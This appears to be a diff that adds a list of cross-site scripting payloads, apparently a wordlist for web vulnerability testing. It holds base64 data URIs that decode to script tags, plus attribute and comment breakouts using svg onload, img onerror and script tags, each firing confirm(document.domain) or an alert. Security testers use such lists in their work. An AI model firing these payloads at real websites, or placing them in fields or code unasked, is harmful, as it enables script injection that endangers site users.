@@ -1,0 +1,19 @@
+data:text/html;base64,PHNjcmlwdD5jb25maXJtKGRvY3VtZW50LmRvbWFpbik8L3NjcmlwdD4= //confirm(document.domain)
+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTUE9TRUQnKTwvc2NyaXB0Pg== //alert('XSSPOSED')
+
+"><svg onload=confirm(domain)>
+
+"><svg onload=alert('XSSPOSED')>
+
+"><script>confirm(document.domain)</script>
+
+"><script>alert('XSSPOSED')</script>
+
+"><img src=x onerror=confirm(domain)>
+
+"><img src=x onerror=alert('XSSPOSED')>
+
+1"--></script><svg/onload=';confirm(domain);'>
+
+1"--></script><svg/onload=';alert('XSSPOSED');'>
